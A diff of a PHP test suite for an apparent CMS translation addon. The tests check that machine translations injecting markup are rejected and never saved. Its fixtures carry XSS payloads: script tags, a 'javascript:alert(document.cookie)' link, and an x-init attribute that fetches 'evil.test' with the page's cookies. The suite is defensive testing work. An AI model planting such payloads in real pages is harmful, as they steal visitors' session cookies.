@@ -583,18 +583,21 @@ describe('model output', function () {
         'a curly brace of the source moved' => [SegmentKind::Plain, 'A { b <x1/>'],
     ]);
 
-    it('saves the source of a text with Antlers whose translation puts a curly brace before a tag, which the page could not parse', function () {
+    it('does not save a text with Antlers whose translation puts a curly brace before a tag, which the page could not parse', function () {
         $this->makeCollection('pages', ['en', 'el', 'de'], [
+            'title' => ['type' => 'text', 'localizable' => true, 'display' => 'Title'],
             'headline' => ['type' => 'text', 'localizable' => true, 'display' => 'Headline', 'antlers' => true],
         ]);
-        $origin = $this->makeEntry('pages', 'en', ['headline' => 'Welcome to {{ site:name }}'], 'welcome');
+        $origin = $this->makeEntry('pages', 'en', ['title' => 'Welcome', 'headline' => 'Welcome to {{ site:name }}'], 'welcome');
         $this->fakeTranslations(fn (string $text) => str_replace('<x1/>', '{<x1/>', 'Willkommen bei '.$text));
 
         $run = RunFixtures::started(['entryIds' => [$origin->id()], 'sites' => ['de']]);
         RunFixtures::finish($run);
         $german = Entry::find($origin->id())->in('de');
 
-        expect($german->get('headline'))->toBe('Welcome to {{ site:name }}')
+        expect(RunFixtures::items($run)[0]->fields)->toBe(['title' => 'applied', 'headline' => 'invalid'])
+            ->and($german->get('title'))->toBe('Willkommen bei Welcome')
+            ->and($german->has('headline'))->toBeFalse()
             ->and((string) Antlers::parse('<h1>{{ headline }}</h1>', $german->toAugmentedArray()))->toStartWith('<h1>Welcome to');
     });
 
@@ -683,7 +686,7 @@ describe('model output', function () {
         $this->makeCollection('pages', ['en', 'el', 'de'], [
             'body' => ['type' => 'markdown', 'localizable' => true, 'display' => 'Body'],
         ]);
-        $body = 'Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.';
+        $body = "Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.\n\nMore text.";
         $origin = $this->makeEntry('pages', 'en', ['body' => $body], 'placeholders');
         $this->fakeTranslations($model);
 
@@ -696,11 +699,11 @@ describe('model output', function () {
     })->with([
         'a model that keeps every placeholder' => [
             fn (string $text) => '[T] '.$text,
-            '[T] Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.',
+            "[T] Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.\n\n[T] More text.",
         ],
         'a model that keeps only the one behind the backslash' => [
             fn (string $text) => preg_replace('/(?<!\\\\)<x\d+\/>/', '', '[T] '.$text),
-            'Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.',
+            "Tolk sends a link as \\<x1/>, and `<script>alert(1)</script>` stays code.\n\n[T] More text.",
         ],
     ]);
 
@@ -711,14 +714,14 @@ describe('model output', function () {
         $this->makeCollection('pages', ['en', 'el', 'de'], [
             'body' => ['type' => 'markdown', 'localizable' => true, 'display' => 'Body'],
         ]);
-        $origin = $this->makeEntry('pages', 'en', ['body' => $body], 'code');
-        $this->fakeTranslations($model);
+        $origin = $this->makeEntry('pages', 'en', ['body' => $body."\n\nMore text."], 'code');
+        $this->fakeTranslations(fn (string $text) => $text === 'More text.' ? '[T] More text.' : $model($text));
 
         $run = RunFixtures::started(['entryIds' => [$origin->id()], 'sites' => ['de']]);
         RunFixtures::finish($run);
         $german = Entry::find($origin->id())->in('de');
 
-        expect($german->get('body'))->toBe($body)
+        expect($german->get('body'))->toBe($body."\n\n[T] More text.")
             ->and((string) $german->augmentedValue('body'))->not->toContain('<script>')->not->toContain(' x-init=')->not->toContain('href="javascript');
     })->with([
         'a backslash before a code span' => ['Use `<script>alert(1)</script>` to test.', fn (string $text) => str_replace('<x1/>', '\\<x1/>', '[T] '.$text)],
@@ -824,14 +827,14 @@ describe('model output', function () {
         $this->makeCollection('pages', ['en', 'el', 'de'], [
             'body' => ['type' => 'markdown', 'localizable' => true, 'display' => 'Body'],
         ]);
-        $origin = $this->makeEntry('pages', 'en', ['body' => $body], 'story');
-        $this->fakeTranslations($model);
+        $origin = $this->makeEntry('pages', 'en', ['body' => $body."\n\nMore text."], 'story');
+        $this->fakeTranslations(fn (string $text) => $text === 'More text.' ? '[T] More text.' : $model($text));
 
         $run = RunFixtures::started(['entryIds' => [$origin->id()], 'sites' => ['de']]);
         RunFixtures::finish($run);
         $german = Entry::find($origin->id())->in('de');
 
-        expect($german->get('body'))->toBe($body)
+        expect($german->get('body'))->toBe($body."\n\n[T] More text.")
             ->and((string) $german->augmentedValue('body'))->not->toContain('href="javascript')->not->toContain('href="//evil.test');
     })->with([
         'in a blockquote' => ['Read our story today.', fn () => "> [x]: javascript:alert(document.cookie)\n\nLesen Sie [unsere Geschichte][x] heute."],
@@ -883,21 +886,27 @@ describe('model output', function () {
             'features' => ['type' => 'list', 'localizable' => true, 'display' => 'Features'],
             'facts' => ['type' => 'array', 'localizable' => true, 'display' => 'Facts'],
         ]);
-        $data = [
+        $origin = $this->makeEntry('menus', 'en', [
             'title' => 'Kids < 12 eat free',
             'prices' => [['cells' => ['Breakfast', 'Served <b>daily</b>']]],
-            'features' => ['<a href="/spa">Spa</a> access'],
-            'facts' => ['when' => 'Open <b>daily</b>'],
-        ];
-        $origin = $this->makeEntry('menus', 'en', $data, 'menu');
+            'features' => ['<a href="/spa">Spa</a> access', 'Free parking'],
+            'facts' => ['when' => 'Open <b>daily</b>', 'where' => 'By the sea'],
+        ], 'menu');
         $kinds = [];
-        $this->fakeTranslations(securityMarkupAttack($kinds));
+        $attack = securityMarkupAttack($kinds);
+        // One text of each field translates, so the field is saved with its other text in the source language (D28).
+        $this->fakeTranslations(fn (string $text, array $segment) => in_array($text, ['Breakfast', 'Free parking', 'By the sea'], true) ? '[T] '.$text : $attack($text, $segment));
 
         $run = RunFixtures::started(['entryIds' => [$origin->id()], 'sites' => ['de']]);
         RunFixtures::finish($run);
         $german = Entry::find($origin->id())->in('de');
 
-        expect($german->data()->only(array_keys($data))->all())->toBe($data)
+        expect($german->data()->only(['title', 'prices', 'features', 'facts'])->all())->toBe([
+            'prices' => [['cells' => ['[T] Breakfast', 'Served <b>daily</b>']]],
+            'features' => ['<a href="/spa">Spa</a> access', '[T] Free parking'],
+            'facts' => ['when' => 'Open <b>daily</b>', 'where' => '[T] By the sea'],
+        ])
+            ->and(RunFixtures::items($run)[0]->fields['title'])->toBe('invalid')
             ->and(json_encode($german->data()->all()))->not->toContain('script')->not->toContain('onerror')
             ->and($kinds)->toContain('plain')->toContain('html');
     });
@@ -905,13 +914,14 @@ describe('model output', function () {
     it('writes the source text of translation strings and form texts instead of a translation that turns their markup into script', function () {
         $this->app->useLangPath($this->temporaryPath('lang'));
         File::ensureDirectoryExists(lang_path('en'));
-        File::put(lang_path('en.json'), json_encode(['Read our terms' => 'Read our <a href=":url">terms</a>.'], JSON_THROW_ON_ERROR));
-        File::put(lang_path('en/booking.php'), "<?php\n\nreturn ['note' => 'Kids < 12 eat free', 'served' => 'Served <b>daily</b>, :count times'];\n");
+        File::put(lang_path('en.json'), json_encode(['Welcome' => 'Welcome', 'Read our terms' => 'Read our <a href=":url">terms</a>.'], JSON_THROW_ON_ERROR));
+        File::put(lang_path('en/booking.php'), "<?php\n\nreturn ['title' => 'Bookings', 'note' => 'Kids < 12 eat free', 'served' => 'Served <b>daily</b>, :count times'];\n");
         FormFixtures::make('privacy', 'Privacy', [
             'consent' => ['type' => 'toggle', 'display' => 'Consent', 'instructions' => 'Read our <a href="/privacy">privacy policy</a>.'],
         ]);
         $kinds = [];
-        $this->fakeTranslations(securityMarkupAttack($kinds));
+        $attack = securityMarkupAttack($kinds);
+        $this->fakeTranslations(fn (string $text, array $segment) => in_array($text, ['Welcome', 'Bookings', 'Privacy', 'Consent'], true) ? '[T] '.$text : $attack($text, $segment));
 
         expect(Artisan::call('tolk:lang', ['sites' => ['de']]))->toBe(0)
             ->and(Artisan::call('tolk:forms', ['sites' => ['de']]))->toBe(0);
@@ -919,14 +929,14 @@ describe('model output', function () {
         $json = json_decode(File::get(lang_path('de.json')), true, flags: JSON_THROW_ON_ERROR);
         $booking = (static fn (string $file) => include $file)(lang_path('de/booking.php'));
 
-        expect($json['Read our terms'])->toBe('Read our <a href=":url">terms</a>.')
-            ->and($json['Read our <a href="/privacy">privacy policy</a>.'])->toBe('Read our <a href="/privacy">privacy policy</a>.')
-            ->and($booking)->toBe(['note' => 'Kids < 12 eat free', 'served' => 'Served <b>daily</b>, :count times'])
+        // A string none of whose parts was translated is not written, so Laravel falls back to the source's (D28).
+        expect($json)->toBe(['Welcome' => '[T] Welcome', 'Privacy' => '[T] Privacy', 'Consent' => '[T] Consent'])
+            ->and($booking)->toBe(['title' => '[T] Bookings'])
             ->and(File::get(lang_path('de.json')).File::get(lang_path('de/booking.php')))->not->toContain('javascript')->not->toContain('onmouseover')->not->toContain('onerror')->not->toContain('script')
             ->and($kinds)->toContain('plain')->toContain('html');
     });
 
-    it('delivers and saves the source text instead of a translation that keeps adding markup', function (string $markdown) {
+    it('delivers and saves none of a translation that keeps adding markup', function (string $markdown) {
         $this->fakeTranslations(fn (string $text, array $segment) => $segment['kind'] === 'markdown'
             ? $markdown
             : $text.' <script>alert(1)</script>');
@@ -939,18 +949,11 @@ describe('model output', function () {
         RunFixtures::finish($run);
         $german = Entry::find($this->origin->id())->in('de');
 
-        expect(array_map(fn (array $field) => $field['value'], $fields))->toBe([
-            'title' => 'Hello',
-            'intro' => 'A short intro.',
-            'body' => 'Read [our story](https://kyma.test/story).',
-        ])
+        // No field has a translated part, so none is delivered or saved, and the run creates no localization (D28).
+        expect($fields)->toBe([])
             ->and(collect($responses)->map->getContent()->implode(''))->not->toContain('<script')->not->toContain('evil.test')->not->toContain('x-init')
-            ->and($german->data()->only(['title', 'intro', 'body'])->all())->toBe([
-                'title' => 'Hello',
-                'intro' => 'A short intro.',
-                'body' => 'Read [our story](https://kyma.test/story).',
-            ])
-            ->and((string) $german->augmentedValue('body'))->toContain('<a href="https://kyma.test/story">our story</a>')->not->toContain('x-init');
+            ->and(RunFixtures::items($run)[0]->fields)->toBe(['title' => 'invalid', 'intro' => 'invalid', 'body' => 'invalid'])
+            ->and($german)->toBeNull();
     })->with([
         'a link' => '[Η ιστορία μας](https://evil.test)',
         'an attribute list' => 'Διαβάστε [την ιστορία μας](<x1/>){x-data="" x-init="fetch(\'//evil.test/\'+document.cookie)"}.',
